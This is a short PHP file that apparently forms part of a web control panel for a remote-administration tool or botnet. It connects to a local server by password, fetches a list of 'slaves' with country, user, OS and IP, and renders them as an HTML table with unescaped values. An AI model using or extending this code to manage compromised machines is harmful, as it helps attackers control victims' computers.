<?php

class Request {
	
	public function createSocket($address = "127.0.0.1", $port = "1335", $password = "PWD") {
		$sock = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socket\n");
		
		socket_connect ($sock, $address, $port) or die("Could not connect to host\n");
				
		self::write($sock, sha1($password));		
		
		return $sock;
	}
	
	public function getSlaves($sock) {
		self::write($sock, 1);
		$raw = socket_read($sock, 1024 * 10, PHP_NORMAL_READ) or die("Could not read from socket\n");
		
		$slaveStrings = explode(";", $raw);
		$slaves = array();
		
		foreach ($slaveStrings as $string) {
			if (strlen($string) <= 1) {
				continue;
			}

			$s = new Slave();
			$s->makearray($string);
			$slaves[] = $s;
		}
		
		return $slaves;
	}
	
	private function write($sock, $s) {
		socket_write($sock, $s . "\n", strlen($s) + 1) or die("Failed to write to socket\n");
	}
}

class Slave {
	
	public $array;
	
	public function makearray($s) {
		$data = explode(":", $s);
		$this->array = array(
				"country" => $data[0],	
				"userstring" => $data[1],
				"os" => $data[2],
				"ip" => $data[3],
		);
	}
	
	public function getTableFormatted() {
		require_once "operatingsystem.php";
		
		$country = '<img src="images/flags/' . strtolower($this->array['country']) . '.png"> ' . $this->array['country'];
		$userstring = '<b>' . $this->array['userstring'] . '</b>';
		$os = $this->array['os'];
		$osIcon = '<img src="' . OperatingSystem::getIcon($os) . '"> ' . $os;
		$ip = $this->array['ip'];
		
		return "<td class=%c>" . $country . "</td>\n<td class=%c>" . $userstring . "</td>\n<td class=%c>" . $osIcon . "</td>\n<td class=%c>$ip</td>\n";
	}
}